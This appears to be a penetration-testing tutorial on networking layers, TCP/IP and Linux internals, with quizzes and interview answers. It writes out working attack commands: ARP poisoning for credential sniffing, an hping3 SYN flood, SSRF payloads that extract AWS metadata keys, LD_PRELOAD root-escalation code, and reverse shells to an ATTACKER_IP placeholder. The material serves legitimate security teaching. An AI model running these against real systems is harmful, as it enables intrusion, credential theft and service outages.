Chapter 01 — Networking & OSI Model

All 7 Layers · Attack Relevance Per Layer · ARP Poisoning · SYN Flood · SSRF

WHY
Purpose
Every attack travels through these layers. If you don't know which layer you're operating at, you can't understand why your tool works or why it fails.
WHAT
Internals
The OSI model is a 7-layer conceptual framework that describes how data moves from one machine to another across a network — from raw bits to application data.
WHERE
Context
In every network packet you capture, every firewall rule, every WAF bypass, every ARP table, every TLS handshake. Networking IS hacking.
WHEN
Timing
Attackers operate at specific layers intentionally. ARP poisoning = L2. IP spoofing = L3. TCP session hijacking = L4. HTTPS stripping = L6. SQLi = L7.
WHO
Audience
Essential for every security role — pentesters, network defenders, SOC analysts, bug bounty hunters. Without this, you're guessing.

All 7 OSI Layers — Deep Internals

The OSI (Open Systems Interconnection) model splits network communication into 7 distinct layers. Data travels down the stack on the sender and up the stack on the receiver — each layer wraps the data with its own header (encapsulation). Here's each layer with its real attack surface:

LayerNamePDUProtocolsAttack Surface

6PresentationDataSSL/TLS, JPEG, ASCIISSL stripping, encoding attacks, XXE
5SessionDataNetBIOS, RPC, SMBSession fixation, cookie theft, replay
4TransportSegmentTCP, UDPSYN flood, TCP hijacking, port scanning
3NetworkPacketIP, ICMP, OSPFIP spoofing, SSRF (169.254.169.254), route injection
2Data LinkFrameEthernet, ARP, MACARP poisoning, MAC flooding, VLAN hopping
1PhysicalBitEthernet cable, Wi-Fi RFCable tapping, rogue AP, signal jamming

Encapsulation — How Data Actually Travels

Concept
# SENDER SIDE — data wraps as it goes DOWN the stack
L7 App Data: "GET /login HTTP/1.1\r\nHost: target.com"
L4 TCP Segment: [SRC:54321 DST:443 SEQ:1000 ACK:0] + App Data
L3 IP Packet: [SRC:192.168.1.5 DST:93.184.216.34] + TCP Seg
L2 Ethernet Frame:[SRC-MAC:aa:bb:cc DST-MAC:ff:ee:dd] + IP Packet
L1 Bits: 0101110011010100110010... (raw electrical signal)

# RECEIVER SIDE — headers stripped as it goes UP the stack
# Each layer reads its header, strips it, passes payload up
# L7 application finally sees: "GET /login HTTP/1.1"

Layer 2 Attack: ARP Poisoning (Man-in-the-Middle)

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. It has no authentication — any machine can broadcast fake ARP replies. This is the foundation of LAN-based man-in-the-middle attacks.

Real Attack
Coffee Shop MITM — ARP Poisoning to Capture Credentials

Attacker sits in a coffee shop on the same Wi-Fi as the victim. The router is at 192.168.1.1. The victim is at 192.168.1.100. The attacker poisons both ARP caches — the router thinks the attacker IS the victim, and the victim thinks the attacker IS the router. All traffic flows through the attacker.

bash — Lab Only, Authorised Network
# ── Enable IP forwarding so traffic passes through us ─────────────
echo 1 > /proc/sys/net/ipv4/ip_forward
# Without this, traffic stops at us — victim loses internet (obvious)

# ── Install arpspoof (part of dsniff package) ─────────────────────
sudo apt install -y dsniff

# ── Tell the VICTIM (192.168.1.100) that WE are the ROUTER ────────
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
# -i eth0 = our network interface
# -t 192.168.1.100 = target (the victim)
# 192.168.1.1 = the host we're impersonating (router)

# ── Tell the ROUTER (192.168.1.1) that WE are the VICTIM ──────────
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# ── Now sniff all traffic passing through us ──────────────────────
sudo tcpdump -i eth0 -w capture.pcap # save all packets to file
sudo urlsnarf -i eth0 # print HTTP URLs in real time
sudo dsniff -i eth0 # extract cleartext credentials (FTP, HTTP, Telnet)

# ── Clean up (restore ARP tables) ─────────────────────────────────
sudo arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
🔵 Blue Team Defense
Dynamic ARP Inspection (DAI) — enterprise switches can validate ARP packets against a trusted DHCP binding table, dropping unsolicited ARP replies.
Static ARP entries — hardcode the router's MAC for critical machines: arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
Detection: Monitor for duplicate IP/MAC pairs, ARP reply storms. Tools: arpwatch, XArp.

Layer 4 Attack: SYN Flood (DoS)

TCP requires a 3-way handshake before any communication. A SYN flood exploits this by sending thousands of SYN packets with spoofed source IPs — the server allocates resources for each half-open connection, exhausting its connection table.

bash — Lab VM Only
# ── hping3 SYN flood — Lab environment ONLY ───────────────────────
sudo hping3 -S --flood -V -p 80 192.168.1.200
# -S = set SYN flag (start handshake, never complete it)
# --flood = send as fast as possible (no inter-packet delay)
# -V = verbose — show packet count
# -p 80 = target port 80 (HTTP)

# ── With random spoofed source IPs (harder to block) ──────────────
sudo hping3 -S --flood --rand-source -p 80 192.168.1.200
# --rand-source = randomise source IP per packet (bypass IP-based blocks)

# ── Watch the effect on the target ────────────────────────────────
# On target machine:
ss -s # see TCP socket statistics — SYN_RECV count explodes
netstat -tn # watch half-open connections fill up

Layer 3 Attack: SSRF via AWS Metadata

When an application fetches URLs on behalf of users, an attacker can redirect those requests to internal network addresses — including the AWS EC2 metadata service at 169.254.169.254, which exposes IAM credentials with zero authentication.

SSRF Attack — PortSwigger Lab
# Target app has a parameter that fetches a URL:
# POST /product/stock HTTP/1.1
# stockApi=https://stock.weliketoshop.net/...

# ── Step 1: Replace with AWS metadata endpoint ────────────────────
stockApi=http://169.254.169.254/latest/meta-data/
# Response reveals the metadata directory listing

# ── Step 2: Dig deeper for IAM credentials ────────────────────────
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response: "ec2-production-role" ← the IAM role name

# ── Step 3: Extract the actual AWS keys ───────────────────────────
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-production-role
# Response:
{
"AccessKeyId": "ASIA...",
"SecretAccessKey": "wJalrXUt...",
"Token": "AQoXnyc..."
}
# These keys grant attacker AWS console access with EC2 role permissions

// Quiz — Chapter 01
Q1: An attacker captures a WPA2 handshake and runs hashcat against it. Which OSI layer is this attack targeting?
Layer 2 (Data Link). WPA2 operates at L2 to authenticate devices to the wireless network. The 4-way handshake happens before any IP traffic flows. Hashcat then cracks the Pre-Shared Key offline — the attacker never needs to stay on-site.
Q2: Why does ARP poisoning work even on switched networks?
ARP has no authentication. Switches forward frames based on MAC tables, but ARP responses are trusted blindly — any device can claim any IP. Switches learn MACs from frames, so when poisoned ARP replies update the victim's cache, the switch's MAC table also gets updated via the new traffic flow.

Chapter 02 — TCP/IP, Ports & Protocols

3-Way Handshake · TCP Flags · All Critical Ports · CIDR · Subnetting

WHY
Purpose
Port scanners, packet crafting tools, network exploitation — all depend on understanding how TCP/UDP sessions are established, maintained, and terminated.
WHAT
Internals
TCP is a stateful, reliable, connection-oriented protocol. UDP is stateless and connectionless. Both are L4 transport protocols that multiplex application data using port numbers.
WHERE
Context
Every network connection your browser makes is TCP. Every DNS query is UDP. Every port scan sends crafted TCP/UDP packets. This is the heartbeat of networking.
WHEN
Timing
During reconnaissance (port scanning), exploitation (connecting to shells), and post-exploitation (pivoting). Also when evading firewalls — UDP often bypasses rules meant for TCP.
WHO
Audience
Every hacker and defender. Without TCP/IP internals, you can't understand Nmap output, interpret Wireshark captures, or design network-level attacks.

The TCP 3-Way Handshake — Full Internals

Before any data flows over TCP, a connection must be established. This takes exactly 3 packets. Each packet contains TCP flags — single-bit fields in the TCP header that control connection state.

TCP State Machine
CLIENT SERVER
│ │
│──── SYN (seq=1000) ────────────────►│ SYN_RECEIVED
│ "I want to connect" │
│ Client picks random ISN=1000 │
│ │
│◄─── SYN-ACK (seq=5000, ack=1001) ──│ SYN_RECEIVED
│ "OK, I'll connect. ISN=5000" │
│ ack=1001 confirms your SYN │
│ │
│──── ACK (ack=5001) ────────────────►│ ESTABLISHED
│ "Got it. Connection open." │
│ │
★ CONNECTION ESTABLISHED — data flows ★

# KEY INSIGHT FOR ATTACKERS:
# SYN scans (nmap -sS) send SYN, wait for SYN-ACK, then RST
# Never complete the handshake = no connection logged in many systems
# ISN (Initial Sequence Number) randomisation prevents prediction attacks

CIDR Notation & Subnet Math

CIDR (Classless Inter-Domain Routing) notation uses a slash followed by the number of network bits. Understanding subnets is critical for identifying live hosts during recon and for pivoting between network segments.

Subnet Reference

/31 → 2 hosts (point-to-point links)
/30 → 2 usable (4 total — small segments)
/29 → 6 usable (8 total)
/28 → 14 usable (16 total)
/27 → 30 usable (32 total)
/24 → 254 usable (256 total — most common LAN: 192.168.1.0/24)

// Quiz — Chapter 02
Q1: Why does Nmap's -sS (SYN scan) require root/sudo privileges?
SYN scanning requires crafting raw packets with specific TCP flags — specifically sending a RST instead of completing the handshake. Raw socket access on Linux requires root/CAP_NET_RAW capability. Without it, the OS handles the socket and automatically completes the handshake (creating a full TCP connect scan instead).
Q2: Port 4444 appears in your Wireshark capture connecting outbound from a server to an external IP. What does this likely indicate?
Very likely a Metasploit Meterpreter reverse shell. Port 4444 is the default listener for Metasploit payloads. The server was probably compromised and is calling back to the attacker's machine. Immediate incident response: isolate the machine, capture memory dump, check /proc/[pid]/exe and netstat for the process making the connection.

Chapter 03 — Linux Architecture

Kernel · Syscalls · Ring 0/3 · execve() · LD_PRELOAD · Reverse Shell Intro

WHY
Purpose
Most servers run Linux. Understanding its internal architecture is what separates a script kiddie from a real hacker. Knowing where privilege lives lets you escalate it.
WHAT
Internals
Linux is a monolithic kernel surrounded by layers: syscall interface, glibc, shell, userspace applications. Each layer has different privilege levels enforced by CPU hardware.
WHERE
Context
Every command you run in a terminal, every web server process, every SUID binary — all interact with the kernel through this architecture. PrivEsc is about crossing the Ring 0/3 boundary.
WHEN
Timing
During privilege escalation (kernel exploits, LD_PRELOAD), during malware analysis (strace reveals syscalls), during CTF binary challenges (understanding execve chains).
WHO
Audience
Pentesters (PrivEsc chains), malware analysts (understanding rootkits), CTF players (binary exploitation). Everyone who touches a Linux system professionally.

The Linux Layer Model

Architecture
┌─────────────────────────────────────────────────────────────┐
│ USER APPLICATIONS bash, nginx, python, curl, etc. │ Ring 3
├─────────────────────────────────────────────────────────────┤
│ C STANDARD LIBRARY glibc — wraps syscalls in friendly API │ Ring 3
│ printf() → write() → sys_write() │
├─────────────────────────────────────────────────────────────┤
│ SYSCALL INTERFACE int 0x80 / syscall instruction │ ← PRIVILEGE BOUNDARY
├─────────────────────────────────────────────────────────────┤
│ LINUX KERNEL process mgmt, memory, I/O, networking │ Ring 0
├─────────────────────────────────────────────────────────────┤
│ HARDWARE CPU, RAM, NIC, Disk │ Ring 0
└─────────────────────────────────────────────────────────────┘

# Ring 0 = kernel mode — unlimited hardware access
# Ring 3 = user mode — restricted — must ask kernel for everything
# Crossing from Ring 3 to Ring 0 = syscall (controlled)
# Exploiting a kernel bug = crossing that boundary UNCONTROLLED = root

Syscalls — The Kernel's API

Every privileged action a program takes — reading a file, creating a socket, spawning a process — goes through a system call. The program puts arguments in registers, puts the syscall number in rax, and executes the syscall instruction. The CPU switches to kernel mode for the duration.

bash — strace to see every syscall
# strace shows EVERY system call a process makes — gold for analysis
strace ls # trace the ls command
# Output sample:
execve("/usr/bin/ls", ["ls"], envp) = 0 # exec the ls binary
openat(AT_FDCWD, ".", O_RDONLY|O_DIRECTORY) = 3 # open current dir
getdents64(3, ..., 32768) = 320 # read directory entries
write(1, "file1 file2 dir1\n", 19) # write to stdout
exit_group(0) # clean exit

# Trace a specific process by PID (excellent for malware analysis)
strace -p 1337 -e trace=network # only show network syscalls
strace -p 1337 -e trace=file # only show file access
strace -p 1337 -o output.txt # save all syscalls to file

# During malware analysis — what files does the binary touch?
strace -e trace=open,openat,read,write ./suspicious_binary 2>&1 | grep -v ENOENT

LD_PRELOAD Hijacking — Privilege Escalation

LD_PRELOAD is an environment variable that tells the dynamic linker to load a specified shared library before all others. If you can control this variable when a SUID binary runs, you can inject your own code that executes as root.

C + bash — LD_PRELOAD Privesc (Lab)
# Condition: sudo preserves LD_PRELOAD (env_keep += LD_PRELOAD in sudoers)
# Check: sudo -l → look for "env_keep" or "SETENV"

# ── Step 1: Create the malicious shared library ───────────────────
cat > /tmp/evil.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// This function runs automatically when the library loads
void __attribute__((constructor)) init() {
setuid(0); // set UID to root
setgid(0); // set GID to root
system("/bin/bash -p"); // spawn root bash shell
}
EOF

# ── Step 2: Compile as shared library ─────────────────────────────
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
# -fPIC = position independent code (required for shared libs)
# -shared = create a .so instead of an executable
# -nostartfiles = don't link standard startup code

# ── Step 3: Exploit — use sudo with LD_PRELOAD set ────────────────
sudo LD_PRELOAD=/tmp/evil.so apache2 # can sudo apache2 with NOPASSWD
# Library loads → init() runs first → setuid(0) → /bin/bash as root
# Result: root shell

Reverse Shell Concept

A reverse shell is when the target machine connects back to the attacker. This bypasses firewalls that block inbound connections but allow outbound traffic (which is most firewalls).

bash — Reverse Shell (Authorised Lab Only)
# ATTACKER MACHINE — set up listener first
nc -lvnp 4444
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p 4444 = listen on port 4444

# TARGET MACHINE — execute reverse shell (after gaining code exec)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# bash -i = interactive bash
# /dev/tcp/IP/PORT = bash's built-in TCP connection
# >& = redirect stdout AND stderr to the TCP socket
# 0>&1 = redirect stdin from stdout (the socket)

# Alternative — Python reverse shell (when bash not available)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Upgrade to fully interactive shell (after connection established)
python3 -c 'import pty;pty.spawn("/bin/bash")' # upgrade to PTY
# Then press: Ctrl+Z → stty raw -echo → fg → reset

// Quiz — Chapter 03
Q1: What is the privilege boundary between Ring 0 and Ring 3, and why do kernel exploits matter to hackers?
Ring 3 (user mode) processes cannot directly access hardware or execute privileged instructions — they must ask the kernel via syscalls. The kernel enforces all security boundaries (file permissions, process isolation, network rules). A kernel exploit bypasses this boundary, executing code at Ring 0 with unlimited privilege — instant root on any Linux system regardless of file permissions or sudo configuration.
Q2: Why is a reverse shell preferred over a bind shell in most real engagements?
A bind shell opens a listening port on the target — the attacker connects in. Most corporate firewalls block inbound connections on arbitrary ports. A reverse shell has the target connect OUT to the attacker — outbound traffic (especially on ports 80, 443, or 53) is usually allowed through firewalls. This makes reverse shells far more reliable in real-world environments with proper perimeter firewalls.

SUID — The Most Important PrivEsc Bit

SUID (Set User ID) — when set on an executable, it runs with the file owner's privileges regardless of who executes it. If root owns a SUID binary, it runs as root for everyone. This is necessary for tools like passwd (needs to write /etc/shadow) but is catastrophic when set on powerful binaries like bash, find, or vim.

Q2: What is the difference between EUID and RUID, and why does it matter for SUID exploitation?
RUID (Real UID) = who you actually are (the user who ran the program). EUID (Effective UID) = what privileges you have during execution. When a SUID binary runs, EUID = file owner (root), RUID = caller (e.g. alice). Some operations check RUID — bash drops privileges if RUID != EUID (which is why we need bash -p or setuid(0) in our exploit code). The -p flag tells bash not to reset EUID to RUID.

Threaded Port Scanner from Scratch

python3 — port_scanner.py
#!/usr/bin/env python3
# Threaded port scanner with banner grabbing
import socket
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

def grab_banner(sock):
  """Try to grab service banner after connection"""
  try:
    sock.settimeout(2)
    # Send HTTP request — many services respond to this
    sock.send(b"HEAD / HTTP/1.0\r\nHost: x\r\n\r\n")
    return sock.recv(1024).decode('utf-8', errors='ignore').strip()
  except:
    return ""

def scan_port(target, port):
  """Attempt TCP connection to target:port"""
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # AF_INET = IPv4, SOCK_STREAM = TCP
    sock.settimeout(1) # 1 second timeout per port
    result = sock.connect_ex((target, port))
    # connect_ex returns 0 on success, error code otherwise
    if result == 0:
      banner = grab_banner(sock)
      sock.close()
      return (port, 'OPEN', banner)
    sock.close()
  except socket.gaierror:
    sys.exit("Hostname could not be resolved")
  return None

def main():
  target = sys.argv[1] # target from command line
  start_port = int(sys.argv[2]) if len(sys.argv) > 2 else 1
  end_port = int(sys.argv[3]) if len(sys.argv) > 3 else 1000

  print(f"Scanning {target} ports {start_port}-{end_port}")
  start_time = datetime.now()

  # ThreadPoolExecutor runs scan_port concurrently
  # max_workers=500 = 500 simultaneous connections
  with ThreadPoolExecutor(max_workers=500) as executor:
    futures = [executor.submit(scan_port, target, port)
               for port in range(start_port, end_port + 1)]
    for future in futures:
      result = future.result()
      if result:
        port, status, banner = result
        print(f"[+] Port {port}: {status}")
        if banner: print(f" Banner: {banner[:80]}")

  print(f"Scan completed in {datetime.now() - start_time}")

6 Technical Interview Questions — Full Model Answers

// Interview Prep — Answer These Out Loud
Q1: Explain the CIA triad with a real-world example for each.
Confidentiality: Only authorised parties can read data. Example: Encrypting a database of customer credit cards with AES-256 so that even if an attacker dumps the database, they get ciphertext, not usable card numbers.

Integrity: Data cannot be modified without detection. Example: Using HMAC signatures on API responses so a man-in-the-middle can't alter the data in transit without invalidating the signature. Also: git's commit hashing.

Availability: Systems are accessible when needed. Example: A SYN flood targeting a hospital's appointment system — even if C and I are maintained, the system being unreachable is a security failure. DDoS attacks target availability.
Q2: What's the difference between vulnerability, threat, and risk?
Vulnerability: A weakness in a system. Example: An unpatched Apache server with CVE-2021-41773 (path traversal).

Threat: Something that might exploit the vulnerability. Example: A ransomware group known to scan for Apache vulnerabilities.

Risk: The product of likelihood × impact. Formula: Risk = Vulnerability × Threat × Asset Value. The same vulnerability on an internet-exposed production server is HIGH risk. The same vulnerability on an isolated dev VM with no sensitive data is LOW risk. Risk prioritisation is what separates security strategy from whack-a-mole patching.
Q3: You're the first responder to a confirmed breach at 2am. What do you do in the first hour?
1. Contain first, investigate second: Isolate the affected machine from the network (unplug or VLAN isolation) — stop ongoing exfiltration without destroying evidence.
2. Preserve evidence: Take a memory dump (Volatility), disk image, and grab logs BEFORE pulling the plug. Evidence in memory is lost on reboot.
3. Determine scope: Is this one machine or lateral movement? Check authentication logs, internal connections, and Active Directory for signs of spread.
4. Escalate: Notify management, legal, and if PII is involved — check GDPR/breach notification obligations (72-hour window in EU).
5. Document everything: Timestamped log of every action taken — this becomes your incident report and legal record.
6. Do NOT reimage immediately: You'll destroy forensic evidence needed to understand how they got in and what they took.
Q4: Walk me through your approach to a black-box web application pentest.
1. Recon: Technology fingerprinting (Wappalyzer, whatweb), directory fuzzing (gobuster), subdomain enum, checking robots.txt, /sitemap.xml, JS files for API endpoints and secrets.
2. Map attack surface: Every input field, every parameter, every file upload, every API endpoint. Use Burp's spider + manual browsing.
3. Authentication testing: Default credentials, brute force protection, password reset flaws, session cookie entropy and HttpOnly/Secure flags.
4. Injection testing: SQLi, XSS, SSTI, XXE, command injection on every input. Use Burp Repeater for manual testing, then SQLmap for confirmed SQL injection.
5. Access control: IDOR (change IDs), horizontal/vertical privilege escalation, JWT tampering, CORS misconfigs.
6. Business logic: Race conditions (two requests simultaneously), negative values in quantities, skipping payment steps.
7. Report: CVSS-scored findings, PoC for each, remediation guidance. Prioritise by impact × exploitability.
Q5: During a bug bounty hunt you find a critical vulnerability that's out of scope. What do you do?
Stop exploiting immediately — the moment you confirm it's out-of-scope, any further testing is potentially unauthorised access under CFAA/CMA regardless of your intent. Then: (1) Report it to the security team through their disclosure contact anyway — out-of-scope means "don't hunt here" not "we don't care about vulnerabilities here". (2) Document exactly what you found and what minimal steps confirmed the issue. (3) Include it in a professional note with the in-scope report. Many programs will reward good-faith out-of-scope disclosures with kudos or even payment. Never weaponise an out-of-scope finding or sit on it.
Q6: Explain how you would detect a Kerberoasting attack in an Active Directory environment.
Kerberoasting requests TGS tickets for Service Principal Names. Detection indicators: (1) Event ID 4769 in Windows Security log — "Kerberos Service Ticket Request" with encryption type 0x17 (RC4-HMAC, which is used specifically because it's faster to crack than AES). (2) Unusual volume: one user requesting TGS tickets for many different SPNs in a short period. (3) Honeypot SPNs: register fake service accounts with attractive names (e.g. SQLServiceAdmin) that are never legitimately used — any TGS request for them is definitively malicious. Detection tools: Microsoft Defender for Identity has built-in Kerberoasting detection, Splunk queries on 4769 with 0x17 cipher.
